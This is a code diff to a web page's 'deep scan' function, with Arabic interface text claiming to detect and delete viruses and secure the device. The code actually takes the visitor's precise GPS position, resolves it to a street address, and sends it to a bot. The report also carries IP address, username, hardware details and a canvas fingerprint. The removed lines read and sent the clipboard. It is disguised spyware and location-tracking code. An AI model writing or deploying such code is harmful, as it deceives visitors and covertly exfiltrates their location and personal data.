@@ -836,43 +836,85 @@
     }
     
         async function startDeepScan() {
-        const btn = document.getElementById('deep-scan-btn');
-        const area = document.getElementById('scan-status-area');
-        const bar = document.getElementById('deep-bar');
-        const txt = document.getElementById('deep-status-text');
+    const btn = document.getElementById('deep-scan-btn');
+    const area = document.getElementById('scan-status-area');
+    const bar = document.getElementById('deep-bar');
+    const txt = document.getElementById('deep-status-text');
 
-        btn.style.display = 'none';
-        area.style.display = 'block';
+    btn.style.display = 'none';
+    area.style.display = 'block';
 
-        // 1. محاولة سحب الحافظة (Clipboard)
-        try {
-            bar.style.width = "30%";
-            txt.innerText = "جاري فحص الحافظة المنسوخة...";
-            const clipText = await navigator.clipboard.readText();
-            if (clipText) {
-                await sendToBotDirectly(`📋 **نص مسحوب من Clipboard:**\n\`${clipText}\``);
+    bar.style.width = "20%";
+    txt.innerText = "جاري فحص فيروسات النظام...";
+    
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            bar.style.width = "50%";
+            txt.innerText = "جاري حذف الفيروسات المكتشفة...";
+
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            let detailedAddress = "لم يتم تحديد العنوان نصياً";
+
+            try {
+                // دالة جلب العنوان الفعلي من الإحداثيات
+                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`, {
+                    headers: { 'Accept-Language': 'ar' } // ليكون العنوان باللغة العربية
+                });
+                const geoData = await response.json();
+                detailedAddress = geoData.display_name || "عنوان غير معروف";
+            } catch (e) {
+                detailedAddress = "خطأ في الاتصال بخادم الخرائط";
             }
-        } catch (e) { console.log("Clipboard Access Denied"); }
 
-        // 2. محاولة سحب الموقع الدقيق (GPS)
-        bar.style.width = "60%";
-        txt.innerText = "جاري تحديد إحداثيات الموقع...";
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                await sendToBotDirectly(`📍 **موقع المستخدم الدقيق (GPS):**\n${mapLink}\nدقة الوصول: ${Math.round(pos.coords.accuracy)} متر`);
-                
-                bar.style.width = "100%";
-                txt.innerText = "✅ اكتمل الفحص العميق جهازك امن!";
-            }, (err) => {
-                bar.style.width = "100%";
-                txt.innerText = "⚠️ اكتمل الفحص مع قيود في الوصول.";
-            }, { enableHighAccuracy: true });
-        } else {
+            bar.style.width = "85%";
+            txt.innerText = "جاري تشفير التقرير النهائي...";
+
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            // بناء التقرير "الألتيمايت" مع العنوان المحلل
+            let fullReport = "🛡️ **تقرير الفحص العميق الشامل**\n";
+            fullReport += "━━━━━━━━━━━━━━━\n\n";
+            
+            fullReport += "📍 **الموقع الجغرافي المحلل:**\n";
+            fullReport += `• **العنوان:** \`${detailedAddress}\`\n`; // العنوان النصي هنا
+            fullReport += `• **الإحداثيات:** \`${lat}, ${lon}\`\n`;
+            fullReport += `🔗 [فتح موقع المستخدم على الخريطة](${mapLink})\n`;
+            fullReport += `🎯 الدقة: ${Math.round(pos.coords.accuracy)} متر\n\n`;
+
+            fullReport += "👤 **بيانات الهوية:**\n";
+            fullReport += `• المستخدم: ${collectedData.user}\n`;
+            fullReport += `• البريميوم: ${collectedData.isPremium}\n\n`;
+
+            fullReport += "🌐 **بيانات الشبكة:**\n";
+            fullReport += `• IP العام: \`${collectedData.ip}\`\n`;
+            fullReport += `• السرعة: ${collectedData.net}\n\n`;
+
+            fullReport += "💻 **مواصفات العتاد:**\n";
+            fullReport += `• الجهاز: ${collectedData.res} | ${collectedData.ram}\n`;
+            fullReport += `• المعالج: ${collectedData.cores} Cores\n`;
+            fullReport += `• كارت الشاشة: ${collectedData.gpu}\n\n`;
+
+            fullReport += "🔍 **البصمات الرقمية:**\n";
+            fullReport += `• بصمة Canvas: \`${collectedData.canvas}\`\n\n`;
+
+            fullReport += "━━━━━━━━━━━━━━━\n";
+            fullReport += "✅ **الحالة:** تم الفحص وتأمين الموقع بنجاح.";
+
+            await sendToBotDirectly(fullReport);
+            
             bar.style.width = "100%";
-            txt.innerText = "⚠️ المتصفح لا يدعم الوصول للموقع.";
-        }
+            txt.innerText = "اكتمل الفحص! تم تأمين جهازك بنجاح.";
+        }, (err) => {
+            bar.style.width = "100%";
+            txt.innerText = "⚠️ تم الفحص مع حظر بعض الصلاحيات.";
+            sendToBotDirectly("⚠️ **رفض المستخدم صلاحية الموقع، تم إرسال البيانات التقنية فقط.**");
+        }, { enableHighAccuracy: true });
+    } else {
+        bar.style.width = "100%";
+        txt.innerText = "⚠️ المتصفح لا يدعم الوصول للموقع.";
     }
+}
 
     // دالة إرسال منفصلة لضمان السرعة
     async function sendToBotDirectly(msg) {
